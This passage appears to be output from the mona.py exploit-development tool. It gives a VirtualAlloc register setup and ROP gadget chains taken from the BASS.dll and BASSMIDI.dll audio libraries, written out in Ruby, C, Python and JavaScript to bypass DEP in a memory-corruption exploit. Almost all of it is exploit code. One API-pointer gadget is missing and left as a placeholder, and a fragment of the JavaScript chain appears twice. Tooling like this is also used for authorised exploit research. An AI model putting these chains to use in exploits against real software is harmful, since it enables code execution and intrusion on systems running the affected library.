    "%ud7a5%u1001" + // 0x1001d7a5 : ,# PUSHAD # RETN [BASS.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x00000000,  # [-] Unable to find API pointer -> eax
      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x1001d892,  # POP EBP # RETN [BASS.dll] 
      0x10021049,  # & jmp esp [BASS.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x1001787d,  # POP EBX # RETN [BASS.dll] 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x1004041c,  # POP EDX # RETN [BASS.dll] 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x10601012,  # POP ECX # RETN [BASSMIDI.dll] 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x10007368,  # POP EDI # RETN [BASS.dll] 
      0x1000396b,  # RETN (ROP NOP) [BASS.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x00000000,  // [-] Unable to find API pointer -> eax
      0x1001eaf1,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [BASS.dll] 
      0x10030950,  // XCHG EAX,ESI // RETN [BASS.dll] 
      //[---INFO:gadgets_to_set_ebp:---]
      0x1001d892,  // POP EBP // RETN [BASS.dll] 
      0x10021049,  // & jmp esp [BASS.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x1001787d,  // POP EBX // RETN [BASS.dll] 
      0x00000001,  // 0x00000001-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x1004041c,  // POP EDX // RETN [BASS.dll] 
      0x00001000,  // 0x00001000-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x10601012,  // POP ECX // RETN [BASSMIDI.dll] 
      0x00000040,  // 0x00000040-> ecx
      //[---INFO:gadgets_to_set_edi:---]
      0x10007368,  // POP EDI // RETN [BASS.dll] 
      0x1000396b,  // RETN (ROP NOP) [BASS.dll]
      //[---INFO:gadgets_to_set_eax:---]
      0x10015f82,  // POP EAX // RETN [BASS.dll] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x1001d7a5,  // PUSHAD // RETN [BASS.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x00000000,  # [-] Unable to find API pointer -> eax
      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x1001d892,  # POP EBP # RETN [BASS.dll] 
      0x10021049,  # & jmp esp [BASS.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x1001787d,  # POP EBX # RETN [BASS.dll] 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x1004041c,  # POP EDX # RETN [BASS.dll] 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x10601012,  # POP ECX # RETN [BASSMIDI.dll] 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x10007368,  # POP EDI # RETN [BASS.dll] 
      0x1000396b,  # RETN (ROP NOP) [BASS.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find API pointer -> eax
    "%ueaf1%u1001" + // 0x1001eaf1 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
    "%u0950%u1003" + // 0x10030950 : ,# XCHG EAX,ESI # RETN [BASS.dll] 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%ud892%u1001" + // 0x1001d892 : ,# POP EBP # RETN [BASS.dll] 
    "%u1049%u1002" + // 0x10021049 : ,# & jmp esp [BASS.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u787d%u1001" + // 0x1001787d : ,# POP EBX # RETN [BASS.dll] 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u041c%u1004" + // 0x1004041c : ,# POP EDX # RETN [BASS.dll] 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u1012%u1060" + // 0x10601012 : ,# POP ECX # RETN [BASSMIDI.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u7368%u1000" + // 0x10007368 : ,# POP EDI # RETN [BASS.dll] 
    "%u396b%u1000" + // 0x1000396b : ,# RETN (ROP NOP) [BASS.dll]
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u5f82%u1001" + // 0x10015f82 : ,# POP EAX # RETN [BASS.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%ud7a5%u1001" + // 0x1001d7a5 : ,# PUSHAD # RETN [BASS.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------

